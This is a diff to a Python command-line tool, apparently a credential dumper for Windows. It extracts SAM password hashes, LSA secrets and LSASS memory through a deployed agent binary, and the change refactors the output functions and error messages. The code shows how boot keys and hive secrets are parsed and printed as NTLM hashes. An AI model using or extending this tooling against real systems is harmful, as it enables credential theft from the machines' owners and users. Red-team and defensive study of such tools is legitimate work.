@@ -55,7 +55,7 @@ def _cmd_dump(args):
     do_lsass = args.lsass
 
     agent_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "bin", "agent.exe")
-    if not os.path.isfile(agent_path):
+    if do_lsass and not os.path.isfile(agent_path):
         print(f"[!] Agent not found: {agent_path}")
         print("    Build it with: cd agent && make cross")
         sys.exit(1)
@@ -79,17 +79,23 @@ def _cmd_dump(args):
                 scope.append("registry")
             if do_lsass:
                 scope.append(f"LSASS pid={lsass_pid}")
-            print(f"[*] Deploying agent ({', '.join(scope)})")
+            print(f"[*] Extracting: {', '.join(scope)}")
 
             result = method.execute(do_registry=do_registry, lsass_pid=lsass_pid)
 
             # SAM
-            if args.sam and result.system_hive and result.sam_hive:
-                _show_sam(result.system_hive, result.sam_hive)
+            if args.sam:
+                if result.system_hive and result.sam_hive:
+                    _show_sam_hive(result)
+                else:
+                    print("\n[-] No SAM data — hive files not accessible")
 
             # LSA
-            if args.lsa and result.system_hive and result.security_hive:
-                _show_lsa(result.system_hive, result.security_hive)
+            if args.lsa:
+                if result.system_hive and result.security_hive:
+                    _show_lsa_hive(result)
+                else:
+                    print("\n[-] No LSA data — hive files not accessible")
 
             # LSASS
             if args.lsass and result.lsass_dump:
@@ -102,14 +108,14 @@ def _cmd_dump(args):
         sys.exit(1)
 
 
-def _show_sam(system_hive: bytes, sam_hive: bytes):
+def _show_sam_hive(result):
     from .secrets.registry import extract_boot_key_from_hive, parse_sam_hive
 
     print()
     print("── SAM Hashes ───────────────────────────────────────────────")
     try:
-        boot_key = extract_boot_key_from_hive(system_hive)
-        hashes = parse_sam_hive(sam_hive, boot_key)
+        boot_key = extract_boot_key_from_hive(result.system_hive)
+        hashes = parse_sam_hive(result.sam_hive, boot_key)
         if hashes:
             for h in hashes:
                 print(f"  {h.username}:{h.rid}:{h.lm_hash or 'aad3b435b51404ee'}:{h.ntlm_hash}:::")
@@ -119,14 +125,14 @@ def _show_sam(system_hive: bytes, sam_hive: bytes):
         print(f"  [!] {e}")
 
 
-def _show_lsa(system_hive: bytes, security_hive: bytes):
+def _show_lsa_hive(result):
     from .secrets.registry import extract_boot_key_from_hive, parse_security_hive
 
     print()
     print("── LSA Secrets ──────────────────────────────────────────────")
     try:
-        boot_key = extract_boot_key_from_hive(system_hive)
-        secrets = parse_security_hive(security_hive, boot_key)
+        boot_key = extract_boot_key_from_hive(result.system_hive)
+        secrets = parse_security_hive(result.security_hive, boot_key)
         if secrets:
             for s in secrets:
                 print(f"  {s.name}: {s.decoded}")
